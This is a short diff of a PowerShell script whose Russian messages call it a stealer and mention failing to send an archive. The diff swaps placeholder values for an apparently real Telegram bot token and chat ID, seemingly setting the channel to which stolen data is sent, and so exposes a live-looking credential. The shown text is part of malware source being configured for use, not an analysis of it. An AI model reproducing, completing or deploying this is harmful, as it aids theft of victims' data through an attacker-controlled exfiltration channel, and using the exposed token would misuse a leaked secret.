@@ -15,8 +15,8 @@ $messages = @{
     FailSend = "Не получилось отправить архив.";
     Finished = "Стиллер завершён.";
 }
-$BotToken = "ВАШ_ТОКЕН"
-$ChatID = "ВАШ_CHAT_ID"
+$BotToken = "8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I"
+$ChatID = "1266539824"
 
 function WriteMsg($key) { Write-Host $messages[$key] }
 
